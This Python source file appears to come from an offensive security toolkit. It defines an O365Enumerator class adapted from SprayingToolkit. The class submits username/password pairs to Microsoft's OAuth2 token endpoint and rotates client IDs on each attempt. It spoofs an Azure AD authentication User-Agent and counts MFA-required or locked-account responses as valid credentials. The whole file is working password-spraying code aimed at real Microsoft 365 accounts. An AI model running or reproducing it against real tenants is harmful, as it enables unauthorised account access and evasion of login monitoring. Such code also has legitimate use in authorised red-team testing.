import os
import random
import uuid

from db.enums.errors import AadError
from enumerators.interfaces.enumerator import VpnEnumerator

from utils.utils import logfile, get_project_root, error, is_subdomain, extract_domain, \
    debug

# Disclaimer
# The code for the OWA enumerator has been copied and adapted from SprayingToolkit
# https://github.com/byt3bl33d3r/SprayingToolkit/blob/master/core/sprayers/owa.py
# CREDIT: @byt3bl33d3r


class O365Enumerator(VpnEnumerator):
    def __init__(self, target, group=None):
        super().__init__()
        self.urls = ["https://login.microsoft.com"]
        self.user_realm = None
        self.client_ids = [
            "4345a7b9-9a63-4910-a426-35363201d503",
            "1b730954-1685-4b74-9bfd-dac224a7b894",
            "0a7bdc5c-7b57-40be-9939-d4c5fc7cd417",
            "1950a258-227b-4e31-a9cf-717495945fc2",
            "00000002-0000-0000-c000-000000000000",
            "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
            "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
            "30cad7ca-797c-4dba-81f6-8b01f6371013"
        ]

    def setup(self, **kwargs):
        di = kwargs.get("Domain")
        self.user_realm = di.get("Microsoft", {}).get("UserRealm")
        super().setup(**kwargs)

    def validate(self) -> tuple:
        return self.user_realm is not None and \
               "NameSpaceType" in self.user_realm.keys() and \
               self.user_realm.get("NameSpaceType") in ["Unknown", "Managed"], None

    def login(self, username, password) -> tuple:
        data = {
            "client_id": random.choice(self.client_ids),
            "grant_type": "password",
            "resource": "https://graph.windows.net",
            "scope": "openid",
            "username": username,
            "password": password
        }
        ua = self.session.headers.get("User-Agent")
        self.session.headers["User-Agent"] = "Windows-AzureAD-Authentication-Provider/1.0"
        res = self.session.post(self.target + "/common/oauth2/token", data=data)
        self.session.headers["User-Agent"] = ua
        auth_data = res.json()
        err = None
        if "access_token" in auth_data.keys():
            return True, res
        if "error_description" in auth_data.keys():
            err = AadError.from_str(auth_data["error_description"])
        if err == AadError.MFA_NEEDED:
            error(f"{username} need MFA")
            return True, res
        elif err == AadError.LOCKED:
            error(f"{username} is locked")
            return True, res
        return False, res

